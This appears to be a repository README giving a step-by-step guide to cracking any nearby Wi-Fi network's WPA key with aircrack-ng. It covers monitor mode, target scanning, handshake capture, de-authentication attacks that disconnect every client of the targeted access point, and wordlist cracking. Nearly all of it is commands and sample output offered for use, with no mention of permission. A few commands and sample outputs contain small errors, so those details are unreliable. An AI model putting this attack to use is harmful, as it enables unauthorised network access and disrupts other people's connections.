# Hack Wi-Fi
This repo contains every step to hack any Wi-Fi in your surroundings.  

**The basic requirement is having a Linux distro booted in your Machine or in a Virtual Machine.**
   - Using VM requires an external Wi-Fi network adapter that should support monitor mode. (Recommended: Alfa network adapter)
   - Using your machine doesn't require any external Wi-Fi adapter if the internal one supports monitor mode.  

## Install aircrack-ng:  
Arch:
```
sudo pacman -S aircrack-ng
```
Kali:
```Managed
sudo apt-get update
sudo apt-get upgrade aircrack-ng
```
Ubuntu/Debian:
```
sudo apt-get update
sudo apt-get install aircrack-ng
```
Fedora:
```
sudo dnf install aircrack-ng
```


## Check your wireless LAN adapter name:
```
ip addr
```
**Find your LAN adapter name below:**  
Here it is wlan0.
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 123.0.0.4/5 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp2s0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 04:42:1a:d0:ee:f4 brd ff:ff:ff:ff:ff:ff
3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 90:e8:68:2c:e8:77 brd ff:ff:ff:ff:ff:ff
    inet 192.168.139.57/16 brd 192.168.255.255 scope global dynamic noprefixroute wlan0
       valid_lft 84054sec preferred_lft 84054sec
    inet6 fe80::a3f5:fa53:55c:b0e7/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```


## Change your adapter from managed mode to monitor mode
**Check it's mode:**
```
iwconfig
```
It should be in managed mode at its initial stage. The wlan0 says it's mode.
```
lo        no wireless extensions.

enp2s0    no wireless extensions.

wlan0     IEEE 802.11  ESSID:"LIBRARY"  
          Mode:Managed  Frequency:5.2 GHz  Access Point: A4:2A:95:2C:33:44   
          Bit Rate=585 Mb/s   Tx-Power=3 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=63/70  Signal level=-47 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

```
**Checking for any conflicting process to kill them:**
```
sudo airmon-ng check kill
```  

**Changing the LAN to monitor mode:**
```
sudo airmon-ng start wlan0
```
Your Wi-Fi connection is deactivated now.

**Check it's mode now:**
```
iwconfig
```
It should be in monitor mode at this stage. The wlan0 says it's mode.
```
lo        no wireless extensions.

enp2s0    no wireless extensions.

wlan0mon  IEEE 800.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=3 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```
If you try to check, the wlan0 name is changed to wlan0mon, because we have changed it to monitor mode.  



## Discover the Access Points:
```
sudo airodump-ng wlan0mon
```
A whole bunch of wireless networks will be discovered here. From there note the BSSID(Would be found in the BSSID column) and the Channel(Would be found in the CH column) of your targeted wireless network. After being done with noting down that information, stop (Ctrl + C) the process.  

**Display only the targetted access point:**
```
sudo airodump-ng wlan0mon -d <BSSID>
```
Replace the above < BSSID > with your targetted network's BSSID that you noted before.  

It will show the information of your targetted network and below it shows the connected device with that network. If you see it is empty below that means,  no devices are connected with that network, and in that case, you need to connect a device so that the handshake file can be exchanged with the AP(Access Point) and you get the chance to capture it on it's way. When you see any connected device below, stop (Ctrl + C) the process.



## Storing the captured HandShake file to the local:
```
sudo airodump-ng -w getpass -c <CHANNEL> --bssid <BSSID> wlan0mon
```
Replace < CHANNEL > with the channel for your targeted network and < BSSID > with your BSSID.  

Here ```getpass``` is going to be the file name of the handshake file we would store.
Don't stop the process (Follow the next steps instead) and leave it till we send the de-authentication request and get the handshake file.



## Send the De-Authentication request:
Open a new console window and input the command there. That means you are instructed not to kill the process of the previous tab. That should be opened because we will get that file on that other window only.  
Enter the below command in the new tab of the console.
```
sudo aireplay-ng deauth 0 -a <BSSID> wlan0mon
```
Replace < BSSID > with your BSSID of the targeted AP.  

This sends the De-Authentication request to the targetted network which means, that each and every connected device will be disconnected and will try to reconnect with the AP again. This is the time we will capture the handshake file and will store it locally. Stop the process after 30 to 45 seconds.



## Checking the directory if the Handshake is captured:
```clear``` all the commands.
List the current directory by ```ls```
If any file named ```getpass-01.cap```is found that means the file is captured and it is ready to be cracked.
If nothing is found named ```getpass-01.cap``` that means the whole process should be completed correctly again.



## Cracking the HandShake file using aircrack-ng:
Cracking that file needs some wordlists. Few wordlists are available in this repo and anyone from this should be downloaded.  
List the directory by ```ls``` to make sure both the wordlist and the Handshake file are present there.  

**Use the below command to crack the key:**  
```aircrack-ng getpass-01.cap -w <WORDLIST-PATH>```  
Replace < WORDLIST-PATH > with the path of the wordlist downloaded.  

_Now the output is either 'THE KEY IS FOUND' or 'THE KEY IS NOT FOUND'. If the key couldn't be found in that particular wordlist, try with a few other wordlists available._  



## Switch to managed mode again from monitor mode:
```
sudo airmon-ng stop wlan0
```
Your Wi-Fi connection is activated now.
